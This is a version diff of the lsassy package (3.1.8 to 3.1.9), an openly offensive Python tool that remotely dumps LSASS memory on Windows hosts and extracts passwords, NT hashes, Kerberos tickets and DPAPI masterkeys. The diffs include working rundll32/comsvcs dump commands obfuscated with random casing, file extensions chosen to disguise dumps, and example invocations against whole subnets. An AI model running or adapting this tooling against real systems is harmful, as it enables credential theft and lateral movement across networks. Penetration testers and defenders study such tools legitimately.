 [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)
 
 <a href="https://asciinema.org/a/441582?autoplay=1" target="_blank"><img src="https://asciinema.org/a/441582.svg" width="80%"></a>
 
 Python tool to remotely extract credentials on a set of hosts. This [blog post](https://en.hackndo.com/remote-lsass-dump-passwords/) explains how it works.
 
 This tool uses [impacket](https://github.com/SecureAuthCorp/impacket) project to remotely read necessary bytes in lsass dump and [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials.
@@ -14,15 +14,15 @@
 |----------------------------------------------|---------------------------------------------------------|
 | [Warning](#warning)                          | Before using this tool, read this                       |
 | [Installation](#installation)                | Lsassy installation                                     |
 | [Basic usage](#basic-usage)                  | Basic lsassy usage                                      |
 | [Advanced usage](#advanced-usage)            | Advanced lsassy usage with params explaination          |
 | [Add dump method](#add-dump-method)          | How to add a custom lsass dump method                   |
 | [Acknowledgments](#acknowledgments)          | Kudos to these people and tools                         |
-| [Official Discord](#official-discord-channel)| Official Discord channel                                |
+| [Official Discord](#official-discord)        | Official Discord server                                 |
 
 ## Warning
 
 Although I have made every effort to make the tool stable, traces may be left if errors occur.
 
 This tool can either leave some lsass dumps if it failed to delete it (even though it tries hard to do so) or leave a scheduled task running if it fails to delete it. This shouldn't happen, but it might. Now, you know, use it with caution.
 
@@ -481,14 +481,20 @@
 * [MrUn1k0d3r](https://twitter.com/MrUn1k0d3r) for [SMB Service Modification technique](https://raw.githubusercontent.com/Mr-Un1k0d3r/SCShell/master/scshell.py)
 * [th3m4ks](https://twitter.com/th3m4ks) and [Qazeer](https://twitter.com/_Qazeer) for [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandblast)
 * [s4ntiago_p](https://twitter.com/s4ntiago_p) for [nanodump](https://github.com/helpsystems/nanodump)
 * [0gtweet](https://twitter.com/0gtweet) for [Rdrleakdiag technique](https://twitter.com/0gtweet/status/1299071304805560321)
 * [Luis Rocha](https://twitter.com/countuponsec) for [SQLDumper technique](https://twitter.com/countuponsec/status/910969424215232518)
 * [Asaf Gilboa](https://mobile.twitter.com/asaf_gilboa) for [LsassSilentProcessExit technique](https://github.com/deepinstinct/LsassSilentProcessExit)
 
-## Official Discord Channel
+## Official Discord
 
-[![Porchetta Industries](https://discordapp.com/api/guilds/736724457258745996/widget.png?style=banner3)](https://discord.gg/sEkn3aa)
+[https://discord.hackndo.com](https://discord.hackndo.com)
 
 ## Known bugs
 
 * Compiled versions don't include table_output because of some weird error with rich library
+
+## Star History
+
+<a href="https://github.com/hackndo/lsassy/stargazers">
+<img width="500" alt="Star History Chart" src="https://api.star-history.com/svg?repos=hackndo/lsassy&type=Date">
+</a>
```

#### html2text {}

```diff
@@ -1,38 +1,38 @@
 # lsassy [![PyPI version](https://d25lcipzij17d.cloudfront.net/
-badge.svg?id=py&type=6&v=v3.1.8&x2=0)](https://pypi.org/project/lsassy) [![PyPI
+badge.svg?id=py&type=6&v=v3.1.9&x2=0)](https://pypi.org/project/lsassy) [![PyPI
 Statistics](https://img.shields.io/pypi/dm/lsassy.svg)](https://pypistats.org/
-packages/lsassy) [![Tests](https://github.com/hackndo/lsassy/workflows/Tests/
-badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=Tests) [!
-[Twitter](https://img.shields.io/twitter/follow/
+packages/lsassy) [![Tests](https://github.com/hackndo/lsassy/actions/workflows/
+lsassy.yml/badge.svg)](https://github.com/hackndo/lsassy/
+actions?workflow=lsassy) [![Twitter](https://img.shields.io/twitter/follow/
 hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/
 follow?screen_name=hackanddo) _[_h_t_t_p_s_:_/_/_a_s_c_i_i_n_e_m_a_._o_r_g_/_a_/_4_4_1_5_8_2_._s_v_g_]Python tool
 to remotely extract credentials on a set of hosts. This [blog post](https://
 en.hackndo.com/remote-lsass-dump-passwords/) explains how it works. This tool
 uses [impacket](https://github.com/SecureAuthCorp/impacket) project to remotely
 read necessary bytes in lsass dump and [pypykatz](https://github.com/skelsec/
 pypykatz) to extract credentials. | Chapters | Description | |-----------------
 -----------------------------|-------------------------------------------------
 --------| | [Warning](#warning) | Before using this tool, read this | |
 [Installation](#installation) | Lsassy installation | | [Basic usage](#basic-
 usage) | Basic lsassy usage | | [Advanced usage](#advanced-usage) | Advanced
 lsassy usage with params explaination | | [Add dump method](#add-dump-method) |
 How to add a custom lsass dump method | | [Acknowledgments](#acknowledgments) |
-Kudos to these people and tools | | [Official Discord](#official-discord-
-channel)| Official Discord channel | ## Warning Although I have made every
-effort to make the tool stable, traces may be left if errors occur. This tool
-can either leave some lsass dumps if it failed to delete it (even though it
-tries hard to do so) or leave a scheduled task running if it fails to delete
-it. This shouldn't happen, but it might. Now, you know, use it with caution. ##
-Installation **lsassy** works with python >= 3.7 ### pip (Recommended) ```bash
-python3 -m pip install lsassy ``` ### From source for development ``` python3
-setup.py install ``` ## Basic Usage **lsassy** works out of the box on multiple
-targets (IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a
-list of targets) ```bash lsassy [-d domain] -u pixis -p P4ssw0rd targets lsassy
-[-d domain] -u pixis -H [LM:]NT targets ``` By default, lsassy will try to dump
+Kudos to these people and tools | | [Official Discord](#official-discord) |
+Official Discord server | ## Warning Although I have made every effort to make
+the tool stable, traces may be left if errors occur. This tool can either leave
+some lsass dumps if it failed to delete it (even though it tries hard to do so)
+or leave a scheduled task running if it fails to delete it. This shouldn't
+happen, but it might. Now, you know, use it with caution. ## Installation
+**lsassy** works with python >= 3.7 ### pip (Recommended) ```bash python3 -
+m pip install lsassy ``` ### From source for development ``` python3 setup.py
+install ``` ## Basic Usage **lsassy** works out of the box on multiple targets
+(IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of
+targets) ```bash lsassy [-d domain] -u pixis -p P4ssw0rd targets lsassy [-
+d domain] -u pixis -H [LM:]NT targets ``` By default, lsassy will try to dump
 lsass remotely using `comsvcs.dll` method, either via WMI or via a remote
 scheduled task. ### Kerberos **lsassy** can authenticate with Kerberos. It
 requires a valid TGT in `KRB5CCNAME` environment variable. See [advanced usage]
 (Lsassy-Advanced-Usage#kerberos) for more details. ```bash lsassy -k targets
 ``` ### Examples ```bash lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.0/
 24 lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.1-10 lsassy -d hackn.lab
 -u pixis -p P4ssw0rd hosts.txt lsassy -d hackn.lab -u pixis -p P4ssw0rd
@@ -219,12 +219,11 @@
 [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandblast) * [s4ntiago_p]
 (https://twitter.com/s4ntiago_p) for [nanodump](https://github.com/helpsystems/
 nanodump) * [0gtweet](https://twitter.com/0gtweet) for [Rdrleakdiag technique]
 (https://twitter.com/0gtweet/status/1299071304805560321) * [Luis Rocha](https:/
 /twitter.com/countuponsec) for [SQLDumper technique](https://twitter.com/
 countuponsec/status/910969424215232518) * [Asaf Gilboa](https://
 mobile.twitter.com/asaf_gilboa) for [LsassSilentProcessExit technique](https://
-github.com/deepinstinct/LsassSilentProcessExit) ## Official Discord Channel [!
-[Porchetta Industries](https://discordapp.com/api/guilds/736724457258745996/
-widget.png?style=banner3)](https://discord.gg/sEkn3aa) ## Known bugs * Compiled
+github.com/deepinstinct/LsassSilentProcessExit) ## Official Discord [https://
+discord.hackndo.com](https://discord.hackndo.com) ## Known bugs * Compiled
 versions don't include table_output because of some weird error with rich
-library
+library ## Star History_[_S_t_a_r_ _H_i_s_t_o_r_y_ _C_h_a_r_t_]
```

### Comparing `lsassy-3.1.8/lsassy/console.py` & `lsassy-3.1.9/lsassy/console.py`

 * *Files 2% similar despite different names*

```diff
@@ -31,14 +31,15 @@
     group_dump.add_argument('-O', '--options', action='store',
                             help='Dump module options (Example procdump_path=/opt/procdump.exe,procdump=procdump.exe')
     group_dump.add_argument('--timeout', action='store', type=int, default=5,
                             help='Max time to wait for lsass dump (Default 5s)')
     group_dump.add_argument('--time-between-commands', action='store', type=int, default=1,
                             help='Time to wait between dump methods commands (Default 1s)')
     group_dump.add_argument('--parse-only', action='store_true', help='Parse dump without dumping')
+    group_dump.add_argument('--dump-only', action='store_true', help='Dump lsass without parsing it')
     group_dump.add_argument('--keep-dump', action='store_true', help='Do not delete lsass dump on remote host')
 
     group_auth = parser.add_argument_group('authentication')
     group_auth.add_argument('-u', '--username', action='store', help='Username')
     group_auth.add_argument('-p', '--password', action='store', help='Plaintext password')
     group_auth.add_argument('-d', '--domain', default="", action='store', help='Domain name')
     group_auth.add_argument('--port', default=445, type=int, action='store', help='Port (Default: 445)')
```

### Comparing `lsassy-3.1.8/lsassy/core.py` & `lsassy-3.1.9/lsassy/core.py`

 * *Files 3% similar despite different names*

```diff
@@ -129,14 +129,18 @@
                     lsassy_logger.error("Drive '{}' is not supported. 'C' drive only.".format(dump_path[0]))
                     return False
                 dump_path = dump_path[2:]
             if dump_path[-1] != "\\":
                 dump_path += "\\"
 
         parse_only = self.args.parse_only
+        dump_only = self.args.dump_only
+        if parse_only and dump_only:
+            lsassy_logger.error("Incompatible options dump_only and parse_only")
+            return False
         keep_dump = self.args.keep_dump
         kerberos_dir = self.args.kerberos_dir
         masterkeys_file = self.args.masterkeys_file
 
         if parse_only and (dump_path is None or self.args.dump_name is None):
             lsassy_logger.error("--dump-path and --dump-name required for --parse-only option")
             return False
@@ -181,39 +185,41 @@
                     file=self.args.dump_name,
                     timeout=self.args.timeout
                 )
                 if file is None:
                     lsassy_logger.error("Unable to open lsass dump.")
                     return False
 
-            credentials, tickets, masterkeys = Parser(file).parse()
+            if not dump_only:
+                credentials, tickets, masterkeys = Parser(file).parse()
             file.close()
 
             if not parse_only and not keep_dump:
                 ImpacketFile.delete(session, file.get_file_path(), timeout=self.args.timeout)
                 lsassy_logger.debug("Lsass dump deleted")
             else:
                 lsassy_logger.debug("Not deleting lsass dump as --parse-only was provided")
 
-            if credentials is None:
+            if not dump_only and credentials is None:
                 lsassy_logger.error("Unable to extract credentials from lsass. Cleaning.")
                 return False
 
-            with lock:
-                Writer(credentials, tickets, masterkeys).write(
-                    self.args.file_format,
-                    self.args.format,
-                    output_file=self.args.outfile,
-                    quiet=self.args.quiet,
-                    users_only=self.args.users,
-                    tickets=not self.args.no_tickets,
-                    masterkeys=self.args.masterkeys,
-                    kerberos_dir=kerberos_dir,
-                    masterkeys_file=masterkeys_file
-                )
+            if not dump_only:
+                with lock:
+                    Writer(credentials, tickets, masterkeys).write(
+                        self.args.file_format,
+                        self.args.format,
+                        output_file=self.args.outfile,
+                        quiet=self.args.quiet,
+                        users_only=self.args.users,
+                        tickets=not self.args.no_tickets,
+                        masterkeys=self.args.masterkeys,
+                        kerberos_dir=kerberos_dir,
+                        masterkeys_file=masterkeys_file
+                    )
 
         except KeyboardInterrupt:
             pass
         except Exception as e:
             lsassy_logger.error("An unknown error has occurred.", exc_info=True)
         finally:
             lsassy_logger.debug("Cleaning...")
```

### Comparing `lsassy-3.1.8/lsassy/credential.py` & `lsassy-3.1.9/lsassy/credential.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumper.py` & `lsassy-3.1.9/lsassy/dumper.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/__init__.py` & `lsassy-3.1.9/lsassy/dumpmethod/__init__.py`

 * *Files 0% similar despite different names*

```diff
@@ -81,15 +81,14 @@
                 except Exception as e:
                     lsassy_logger.error("{} upload error".format(self.name), exc_info=True)
                     return None
         else:
             if not ImpacketFile.create_file(session, self.remote_share, self.remote_path, self.file, self.content):
                 lsassy_logger.error("{} upload error".format(self.name), exc_info=True)
                 return None
-            print("{} uploaded".format(self.name))
             self.uploaded = True
             return True
 
     def clean(self, session, timeout):
         if self.uploaded:
             ImpacketFile.delete(session, self.remote_path + self.file, timeout=timeout)
 
@@ -106,15 +105,16 @@
     dump_share = "C$"
     dump_path = "\\Windows\\Temp\\"
 
     exec_methods = ("smb", "wmi", "task", "mmc")
 
     ext = ["csv", "db", "dbf", "log", "sav", "sql", "tar", "xml", "fnt", "fon", "otf", "ttf", "bak", "cfg",
            "cpl", "cur", "dll", "drv", "icns", "ico", "ini", "lnk", "msi", "sys", "tmp", "doc", "docx", "odt",
-           "pdf", "rtf", "tex", "txt", "wpd", "png", "jpg"]
+           "pdf", "rtf", "tex", "txt", "wpd", "png", "jpg", "vhd", "vhdx", "avhd", "avhdx", "vsv", "iso", "rct",
+           "vmcx", "vmrs"]
 
     def __init__(self, session, timeout, time_between_commands, *args, **kwargs):
         self._session = session
         self._file = ImpacketFile(self._session)
         self._file_handle = None
         self._executor_name = ""
         self._executor_path = ""
```

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/comsvcs.py` & `lsassy-3.1.9/lsassy/dumpmethod/comsvcs.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/comsvcs_stealth.py` & `lsassy-3.1.9/lsassy/dumpmethod/comsvcs_stealth.py`

 * *Files 6% similar despite different names*

```diff
@@ -29,22 +29,22 @@
     def get_commands(self):
         tasklist = self.random_case("tasklist")
         lsass = self.random_case("lsass")
         copy_command = "copy {}{}.log {}{}".format(self.dump_path, self.dump_name, self.dump_path, self.dump_name)
             
         cmd_command = [
             """for /f "tokens=1,2 delims= " ^%A in ('"{} /fi "Imagename eq {}.ex*" | find "lsass""') do rundll32.exe C:{}{} #+0000^24 ^%B {}{} full""".format(
-                tasklist, lsass, self.comsvcs_copy_path, self.comsvcs_copy_name, self.dump_path, self.dump_name
+                tasklist, lsass, self.comsvcs_copy_path, self.comsvcs_copy_name, self.dump_path, self.dump_name + ".log"
             ),
             copy_command
         ]
 
         pwsh_command = [
             """rundll32.exe C:{}{} `#+0000^24 (Get-Process {}).Id {}{} full""".format(
-                 self.comsvcs_copy_path, self.comsvcs_copy_name, lsass, self.dump_path, self.dump_name
+                 self.comsvcs_copy_path, self.comsvcs_copy_name, lsass, self.dump_path, self.dump_name + ".log"
             ),
             copy_command
         ]
 
         return {
             "cmd": cmd_command,
             "pwsh": pwsh_command
```

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/dllinject.py` & `lsassy-3.1.9/lsassy/dumpmethod/dllinject.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/dumpert.py` & `lsassy-3.1.9/lsassy/dumpmethod/dumpert.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/dumpertdll.py` & `lsassy-3.1.9/lsassy/dumpmethod/dumpertdll.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/mirrordump.py` & `lsassy-3.1.9/lsassy/dumpmethod/mirrordump.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/mirrordump_embedded.py` & `lsassy-3.1.9/lsassy/dumpmethod/mirrordump_embedded.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/nanodump.py` & `lsassy-3.1.9/lsassy/dumpmethod/nanodump.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/nanodump_ssp_embedded.py` & `lsassy-3.1.9/lsassy/dumpmethod/nanodump_ssp_embedded.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/ppldump.py` & `lsassy-3.1.9/lsassy/dumpmethod/ppldump.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/ppldump_embedded.py` & `lsassy-3.1.9/lsassy/dumpmethod/ppldump_embedded.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/procdump.py` & `lsassy-3.1.9/lsassy/dumpmethod/procdump.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/procdump_embedded.py` & `lsassy-3.1.9/lsassy/dumpmethod/procdump_embedded.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/rawrpc.py` & `lsassy-3.1.9/lsassy/dumpmethod/rawrpc.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/rawrpc_embedded.py` & `lsassy-3.1.9/lsassy/dumpmethod/rawrpc_embedded.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/rdrleakdiag.py` & `lsassy-3.1.9/lsassy/dumpmethod/rdrleakdiag.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/silentprocessexit.py` & `lsassy-3.1.9/lsassy/dumpmethod/silentprocessexit.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/sqldumper.py` & `lsassy-3.1.9/lsassy/dumpmethod/sqldumper.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/dumpmethod/wer.py` & `lsassy-3.1.9/lsassy/dumpmethod/wer.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/exec/__init__.py` & `lsassy-3.1.9/lsassy/exec/__init__.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/exec/mmc.py` & `lsassy-3.1.9/lsassy/exec/mmc.py`

 * *Files 1% similar despite different names*

```diff
@@ -169,7 +169,8 @@
         arg3['_varUnion']['tag'] = VARENUM.VT_BSTR
         arg3['_varUnion']['bstrVal']['asData'] = '7'
         dispParams['rgvarg'].append(arg3)
         dispParams['rgvarg'].append(arg2)
         dispParams['rgvarg'].append(arg1)
         dispParams['rgvarg'].append(arg0)
         self.__executeShellCommand[0].Invoke(self.__executeShellCommand[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
+        return True
```

### Comparing `lsassy-3.1.8/lsassy/exec/smb.py` & `lsassy-3.1.9/lsassy/exec/smb.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/exec/smb_stealth.py` & `lsassy-3.1.9/lsassy/exec/smb_stealth.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/exec/task.py` & `lsassy-3.1.9/lsassy/exec/task.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/exec/wmi.py` & `lsassy-3.1.9/lsassy/exec/wmi.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/impacketfile.py` & `lsassy-3.1.9/lsassy/impacketfile.py`

 * *Files 0% similar despite different names*

```diff
@@ -49,15 +49,16 @@
         try:
             self._tid = self._session.smb_session.connectTree(self._share_name)
         except Exception as e:
             lsassy_logger.warning("ConnectTree error with '{}'".format(self._share_name), exc_info=True)
             return None
         return self
 
-    def create_file(self, session, share, path, file, content):
+    @staticmethod
+    def create_file(session, share, path, file, content):
         
 
         path = path.replace("\\", "/")
         try:
             share, fpath = share, path + "/" + file
         except Exception as e:
             lsassy_logger.warning("Parsing error with '{}'".format(path), exc_info=True)
```

### Comparing `lsassy-3.1.8/lsassy/logger.py` & `lsassy-3.1.9/lsassy/logger.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/output/__init__.py` & `lsassy-3.1.9/lsassy/output/__init__.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/output/json_output.py` & `lsassy-3.1.9/lsassy/output/json_output.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/output/pretty_output.py` & `lsassy-3.1.9/lsassy/output/table_output.py`

 * *Files 25% similar despite different names*

```diff
@@ -1,39 +1,47 @@
-from lsassy.output import IOutput
-from lsassy.logger import lsassy_logger
-
-
-class Output(IOutput):
-    """
-    Return output in pretty colorful format
-    """
-    def get_output(self):
-        output = []
-        if len(self._credentials) == 0:
-            return "No credentials found"
-        else:
-            max_size = max(len(c["domain"]) + len(c["username"]) for c in self._credentials)
-            credentials = []
-            for cred in self._credentials:
-                cred_type = "PWD"
-                if cred["password"] is None:
-                    if cred["ticket"] is not None:
-                        cred["password"] = "Domain: {} - End time: {} ({})".format(cred["ticket"]["domain"], cred["ticket"]["endtime"].strftime("%Y-%m-%d %H:%M"), cred['ticket']['file'])
-                        cred_type = "TGT"
-                    elif cred["masterkey"] is not None:
-                        cred["password"] = "{}".format(cred["masterkey"])
-                        cred_type = "DPAPI Masterkey"
-                    else:
-                        cred["password"] = ':'.join(h for h in [cred["lmhash"], cred["nthash"]] if h is not None)
-                        cred_type = "NT"
-                if [cred["domain"], cred["username"], cred["password"]] not in credentials:
-                    credentials.append([cred["domain"], cred["username"], cred["password"]])
-                    output.append(
-                        "{}{}{}{}{}{}".format(
-                            ('{}\\'.format(cred["domain"]) if cred["domain"] is not None and cred["domain"] != "" else " "),
-                            cred["username"],
-                            " " * (max_size - len(cred["domain"]) - len(cred["username"]) + 2),
-                            lsassy_logger.lsassy_highlight("[{}] ".format(cred_type)),
-                            lsassy_logger.lsassy_highlight(cred["password"]),
-                            " | {}".format(lsassy_logger.lsassy_highlight("[{}] {}".format("SHA1", cred["sha1"]))) if cred["sha1"] else "")
-                    )
-        return "\n".join(output)
+from rich import box
+from rich.console import Console
+from rich.table import Table
+
+from lsassy.output import IOutput
+
+
+class Output(IOutput):
+    """
+    Return output in pretty colorful format
+    """
+    def get_output(self):
+        table = Table(
+            show_header=True,
+            header_style="bold blue",
+            border_style="grey35",
+            caption_style="",
+            caption_justify="left",
+            box=box.SQUARE
+        )
+
+        table.add_column("Username")
+        table.add_column("Password")
+        table.add_column("Hash")
+        table.add_column("TGT")
+        table.add_column("Sha1")
+        table.add_column("Masterkeys")
+        credentials = []
+        for cred in self._credentials:
+            if [cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"], cred["sha1"], cred["ticket"],  cred["masterkey"]] not in credentials:
+                credentials.append([cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"], cred["sha1"], cred["ticket"],  cred["masterkey"]])
+                table.add_row(
+                    "{}{}".format(
+                        "{}\\".format(cred["domain"]) if cred["domain"] is not None and cred["domain"] != "" else "",
+                        cred["username"] if cred["username"] is not None and cred["username"] != "" else ""
+                    ),
+                    cred["password"] if cred["password"] is not None else "",
+                    ':'.join(h for h in [cred["lmhash"], cred["nthash"]] if h is not None),
+
+                    cred["sha1"] if cred["sha1"] is not None else "",
+                    "{} - {}".format(cred["ticket"]["domain"], cred["ticket"]["endtime"].strftime("%Y-%m-%d %H:%M")) if cred["ticket"] is not None else "",
+                    "{}".format(cred["masterkey"]) if cred["masterkey"] is not None else "")
+        console = Console()
+        with console.capture() as capture:
+            console.print(table)
+        return capture.get()
+
```

### Comparing `lsassy-3.1.8/lsassy/parser.py` & `lsassy-3.1.9/lsassy/parser.py`

 * *Files 3% similar despite different names*

```diff
@@ -78,11 +78,12 @@
                     # Keep only valid tickets
                     if ticket.EndTime > datetime.now(ticket.EndTime.tzinfo):
 
                         credentials.append(Credential(
                             ssp="kerberos",
                             domain=ticket.DomainName,
                             username=ticket.EClientName[0],
-                            ticket={'file': list(ticket.kirbi_data)[0], 'domain': target_domain, 'endtime': ticket.EndTime}
+                            ticket={'file': list(ticket.kirbi_data)[0].split(".kirbi")[0] + '_' + ticket.EndTime.strftime('%Y%m%d%H%M%S') + ".kirbi", 'domain': target_domain, 'endtime': ticket.EndTime}
                         ))
+                        
 
         return credentials, tickets, masterkeys
```

### Comparing `lsassy-3.1.8/lsassy/session.py` & `lsassy-3.1.9/lsassy/session.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/utils.py` & `lsassy-3.1.9/lsassy/utils.py`

 * *Files identical despite different names*

### Comparing `lsassy-3.1.8/lsassy/writer.py` & `lsassy-3.1.9/lsassy/writer.py`

 * *Files 13% similar despite different names*

```diff
@@ -63,17 +63,29 @@
                 lsassy_logger.error("Directory {} does not exist".format(path))
                 return None
 
             with open(output_file, 'a+') as f:
                 f.write(file_content + "\n")
             print("Credentials saved to {}".format(output_file))
 
-        self.write_tickets(kerberos_dir, quiet)
-        self.write_masterkeys(masterkeys_file, quiet)
+        if os.name == 'nt':
+            output_dir = '%LocalAppData%\\lsassy'
+        else:
+            output_dir = os.path.expanduser('~') + '/.config/lsassy'
 
+        if not os.path.exists(output_dir):
+            try:
+                os.makedirs(output_dir)
+                self.write_tickets(kerberos_dir, quiet)
+                self.write_masterkeys(masterkeys_file, quiet)
+            except Exception:
+                return output
+        else:
+            self.write_tickets(kerberos_dir, quiet)
+            self.write_masterkeys(masterkeys_file, quiet)
         return output
 
     def write_tickets(self, kerberos_dir=None, quiet=False):
         """
         Output masterkeys to file
         :param kerberos_dir: Output dir
         :param quiet: If set, doesn't display on stdout
@@ -93,15 +105,18 @@
             if not os.path.exists(abs_dir):
                 try:
                     os.makedirs(abs_dir)
                 except Exception as e:
                     lsassy_logger.warning("Cannot create %s for saving kerberos tickets" % abs_dir, exc_info=True)
                     return True
             for ticket in self._tickets:
-                ticket.to_kirbi(abs_dir)
+                for filename in ticket.kirbi_data:
+                    # Trick to add expiration date in ticket filename "YEAR MONTH DAY HOUR MINUTE SECOND"
+                    with open(os.path.join(abs_dir, filename.split(".kirbi")[0] + '_' + ticket.EndTime.strftime('%Y%m%d%H%M%S') + ".kirbi"), 'wb') as f:
+                        f.write(ticket.kirbi_data[filename].dump())
             if not quiet:
                 if len(self._tickets) > 1:
                     print("%s Kerberos tickets written to %s" % (len(self._tickets),abs_dir))
                 else:
                     print("%s Kerberos ticket written to %s" % (len(self._tickets),abs_dir))
 
         return True
```

### Comparing `lsassy-3.1.8/lsassy.egg-info/PKG-INFO` & `lsassy-3.1.9/lsassy.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: lsassy
-Version: 3.1.8
+Version: 3.1.9
 Summary: Python library to extract credentials from lsass remotely
 Home-page: https://github.com/Hackndo/lsassy/
 Author: Pixis
 Author-email: hackndo@gmail.com
 License: MIT
 Classifier: Programming Language :: Python :: 3.6
 Classifier: Programming Language :: Python :: 3.7
@@ -13,17 +13,17 @@
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
 Description-Content-Type: text/markdown
 License-File: LICENSE
 
 # lsassy
-[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=v3.1.8&x2=0)](https://pypi.org/project/lsassy)
+[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=v3.1.9&x2=0)](https://pypi.org/project/lsassy)
 [![PyPI Statistics](https://img.shields.io/pypi/dm/lsassy.svg)](https://pypistats.org/packages/lsassy)
-[![Tests](https://github.com/hackndo/lsassy/workflows/Tests/badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=Tests)
+[![Tests](https://github.com/hackndo/lsassy/actions/workflows/lsassy.yml/badge.svg)](https://github.com/hackndo/lsassy/actions?workflow=lsassy)
 [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)
 
 <a href="https://asciinema.org/a/441582?autoplay=1" target="_blank"><img src="https://asciinema.org/a/441582.svg" width="80%"></a>
 
 Python tool to remotely extract credentials on a set of hosts. This [blog post](https://en.hackndo.com/remote-lsass-dump-passwords/) explains how it works.
 
 This tool uses [impacket](https://github.com/SecureAuthCorp/impacket) project to remotely read necessary bytes in lsass dump and [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials.
@@ -32,15 +32,15 @@
 |----------------------------------------------|---------------------------------------------------------|
 | [Warning](#warning)                          | Before using this tool, read this                       |
 | [Installation](#installation)                | Lsassy installation                                     |
 | [Basic usage](#basic-usage)                  | Basic lsassy usage                                      |
 | [Advanced usage](#advanced-usage)            | Advanced lsassy usage with params explaination          |
 | [Add dump method](#add-dump-method)          | How to add a custom lsass dump method                   |
 | [Acknowledgments](#acknowledgments)          | Kudos to these people and tools                         |
-| [Official Discord](#official-discord-channel)| Official Discord channel                                |
+| [Official Discord](#official-discord)        | Official Discord server                                 |
 
 ## Warning
 
 Although I have made every effort to make the tool stable, traces may be left if errors occur.
 
 This tool can either leave some lsass dumps if it failed to delete it (even though it tries hard to do so) or leave a scheduled task running if it fails to delete it. This shouldn't happen, but it might. Now, you know, use it with caution.
 
@@ -499,14 +499,20 @@
 * [MrUn1k0d3r](https://twitter.com/MrUn1k0d3r) for [SMB Service Modification technique](https://raw.githubusercontent.com/Mr-Un1k0d3r/SCShell/master/scshell.py)
 * [th3m4ks](https://twitter.com/th3m4ks) and [Qazeer](https://twitter.com/_Qazeer) for [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandblast)
 * [s4ntiago_p](https://twitter.com/s4ntiago_p) for [nanodump](https://github.com/helpsystems/nanodump)
 * [0gtweet](https://twitter.com/0gtweet) for [Rdrleakdiag technique](https://twitter.com/0gtweet/status/1299071304805560321)
 * [Luis Rocha](https://twitter.com/countuponsec) for [SQLDumper technique](https://twitter.com/countuponsec/status/910969424215232518)
 * [Asaf Gilboa](https://mobile.twitter.com/asaf_gilboa) for [LsassSilentProcessExit technique](https://github.com/deepinstinct/LsassSilentProcessExit)
 
-## Official Discord Channel
+## Official Discord
 
-[![Porchetta Industries](https://discordapp.com/api/guilds/736724457258745996/widget.png?style=banner3)](https://discord.gg/sEkn3aa)
+[https://discord.hackndo.com](https://discord.hackndo.com)
 
 ## Known bugs
 
 * Compiled versions don't include table_output because of some weird error with rich library
+
+## Star History
+
+<a href="https://github.com/hackndo/lsassy/stargazers">
+<img width="500" alt="Star History Chart" src="https://api.star-history.com/svg?repos=hackndo/lsassy&type=Date">
+</a>
